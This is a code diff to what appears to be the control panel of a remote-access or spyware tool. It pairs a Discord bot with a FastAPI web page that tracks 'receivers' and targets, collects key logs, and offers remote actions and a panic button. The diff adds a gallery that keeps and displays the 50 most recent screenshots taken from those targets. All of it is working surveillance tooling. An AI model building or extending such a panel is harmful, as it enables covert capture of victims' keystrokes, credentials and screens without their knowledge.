@@ -48,6 +48,8 @@ assert TARGET_CHANNEL_ID
 
 ROOT_DIR = Path(__file__).parent
 _latest_screenshot: dict[str, str] = {"url": "", "message_id": "", "ts": ""}
+_screenshot_log: list[dict[str, str]] = []
+_MAX_SCREENSHOTS = 50
 _latest_keylog: dict[str, str] = {"text": "", "message_id": "", "ts": ""}
 STATE_FILE = ROOT_DIR / "receivers.json"
 _receivers: dict[str, dict] = {}  # id -> {"alias": str, "last_seen": float, "tag": str, "mode": str}
@@ -136,9 +138,17 @@ async def on_message(message: discord.Message):
         for att in message.attachments:
             name = (att.filename or "").lower()
             if name.endswith((".png", ".jpg", ".jpeg")):
+                msg_id = str(message.id)
                 _latest_screenshot["url"] = att.url
-                _latest_screenshot["message_id"] = str(message.id)
+                _latest_screenshot["message_id"] = msg_id
                 _latest_screenshot["ts"] = str(message.created_at)
+                if not _screenshot_log or _screenshot_log[0].get("message_id") != msg_id:
+                    _screenshot_log.insert(
+                        0,
+                        {"url": att.url, "message_id": msg_id, "ts": str(message.created_at)},
+                    )
+                    if len(_screenshot_log) > _MAX_SCREENSHOTS:
+                        del _screenshot_log[_MAX_SCREENSHOTS:]
                 break
     # Track latest key logs posted by receiver
     if message.channel.id == LOG_CHANNEL_ID and message.content:
@@ -256,6 +266,15 @@ CONTROL_HTML = """<!doctype html>
     .rename-section h2 { margin: 0 0 10px; font-size: 14px; letter-spacing: 0.3px; }
     .rename-grid { display: grid; grid-template-columns: minmax(200px, 1fr) auto; gap: 10px; align-items: center; }
     .rename-select { width: 100%; padding: 10px; border-radius: 10px; border: 1px solid var(--border); background: #0c0817; color: var(--text); }
+    .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 10px; }
+    .shot-thumb { border-radius: 10px; border: 1px solid var(--border); background: #0c0817; overflow: hidden; cursor: pointer; }
+    .shot-thumb img { display: block; width: 100%; height: 90px; object-fit: cover; }
+    .shot-empty { padding: 12px; border: 1px dashed var(--border); border-radius: 12px; color: var(--muted); }
+    .modal { position: fixed; inset: 0; background: rgba(7,3,15,0.85); display: none; align-items: center; justify-content: center; z-index: 1300; }
+    .modal.open { display: flex; }
+    .modal-card { width: min(960px, 92vw); max-height: 90vh; background: linear-gradient(145deg, rgba(14,10,26,0.96), rgba(18,14,30,0.99)); border: 1px solid var(--border); border-radius: 14px; padding: 12px; box-shadow: 0 12px 36px rgba(0,0,0,0.4); }
+    .modal-card img { width: 100%; height: auto; max-height: 80vh; object-fit: contain; border-radius: 10px; border: 1px solid var(--border); }
+    .modal-close { margin-top: 10px; display: flex; justify-content: flex-end; }
     .panic-btn { position: fixed; right: 24px; bottom: 24px; z-index: 999; background: linear-gradient(135deg, #f97316, var(--danger)); color: #0b0419; box-shadow: 0 12px 24px rgba(239,68,68,0.35); }
     .panic-btn:active { transform: translateY(1px); }
     .locked .app { pointer-events: none; filter: blur(1px); }
@@ -272,6 +291,7 @@ CONTROL_HTML = """<!doctype html>
         <button class="tab-btn" data-tab="select">Select Target</button>
         <button class="tab-btn" data-tab="openclose">Open & Close :3</button>
         <button class="tab-btn" data-tab="volume">Volume ;0</button>
+        <button class="tab-btn" data-tab="shots">Screenshots</button>
         <button class="tab-btn" data-tab="logs">Logs</button>
         <button class="tab-btn" data-tab="remotes">remote's</button>
       </div>
@@ -327,6 +347,13 @@ CONTROL_HTML = """<!doctype html>
           <button type="submit">Set Volume</button>
         </form>
       </div>
+      <div class="tab-pane" data-tab="shots">
+        <h1>Screenshots</h1>
+        <p style="color:var(--muted); margin-bottom:12px;">
+          Recent screenshots appear here. Click any thumbnail to view it larger.
+        </p>
+        <div id="shots-grid" class="gallery-grid"></div>
+      </div>
       <div class="tab-pane" data-tab="logs">
         <h1>Key Logs</h1>
         <p style="color:var(--muted); margin-bottom:12px;">
@@ -367,6 +394,14 @@ CONTROL_HTML = """<!doctype html>
     </div>
   </div>
   <button id="panic-btn" class="panic-btn" type="button">Panic Mode</button>
+  </div>
+  <div id="shot-modal" class="modal">
+    <div class="modal-card">
+      <img id="shot-modal-img" alt="Screenshot preview">
+      <div class="modal-close">
+        <button id="shot-modal-close" class="secondary" type="button">Close</button>
+      </div>
+    </div>
   </div>
   <div id="pin-overlay" class="pin-overlay">
     <div class="pin-card">
@@ -414,6 +449,10 @@ CONTROL_HTML = """<!doctype html>
     const renameSelect = document.getElementById('rename-target');
     const renameInput = document.getElementById('rename-alias');
     const renameTrigger = document.getElementById('rename-trigger');
+    const shotsGrid = document.getElementById('shots-grid');
+    const shotModal = document.getElementById('shot-modal');
+    const shotModalImg = document.getElementById('shot-modal-img');
+    const shotModalClose = document.getElementById('shot-modal-close');
 
     function updateRenameSection(rec) {
       if (!renameForm || !renameSelect || !renameInput || !renameTrigger) return;
@@ -585,6 +624,37 @@ CONTROL_HTML = """<!doctype html>
         }
       } catch (e) { /* ignore */ }
     }
+    async function refreshScreenshots() {
+      if (!shotsGrid) return;
+      try {
+        const res = await fetch('/api/screenshots');
+        if (!res.ok) return;
+        const data = await res.json();
+        const items = data.items || [];
+        shotsGrid.innerHTML = '';
+        if (!items.length) {
+          const empty = document.createElement('div');
+          empty.className = 'shot-empty';
+          empty.textContent = 'No screenshots yet.';
+          shotsGrid.appendChild(empty);
+          return;
+        }
+        items.forEach(item => {
+          const wrap = document.createElement('div');
+          wrap.className = 'shot-thumb';
+          const img = document.createElement('img');
+          img.alt = 'Screenshot';
+          img.src = item.url;
+          wrap.appendChild(img);
+          wrap.addEventListener('click', () => {
+            if (!shotModal || !shotModalImg) return;
+            shotModalImg.src = item.url;
+            shotModal.classList.add('open');
+          });
+          shotsGrid.appendChild(wrap);
+        });
+      } catch (e) { /* ignore */ }
+    }
     async function submitFormNoReload(form) {
       const method = (form.method || 'post').toUpperCase();
       const data = new FormData(form);
@@ -628,8 +698,10 @@ CONTROL_HTML = """<!doctype html>
     activateTab('surprise');
     refreshReceivers();
     refreshLogs();
+    refreshScreenshots();
     setInterval(refreshReceivers, 5000);
     setInterval(refreshLogs, 5000);
+    setInterval(refreshScreenshots, 5000);
 
     document.querySelectorAll('.app form').forEach(form => {
       if (form.id === 'pin-form') return;
@@ -656,6 +728,12 @@ CONTROL_HTML = """<!doctype html>
         } catch (e) {
           alert('Panic request failed.');
         }
+      });
+    }
+    if (shotModal && shotModalClose) {
+      shotModalClose.addEventListener('click', () => shotModal.classList.remove('open'));
+      shotModal.addEventListener('click', (e) => {
+        if (e.target === shotModal) shotModal.classList.remove('open');
       });
     }
   </script>
@@ -758,6 +836,10 @@ async def gif_stop():
 @app.get("/api/screenshot")
 async def api_screenshot():
     return JSONResponse(_latest_screenshot)
+
+@app.get("/api/screenshots")
+async def api_screenshots():
+    return JSONResponse({"items": _screenshot_log})
 
 @app.get("/api/logs")
 async def api_logs():
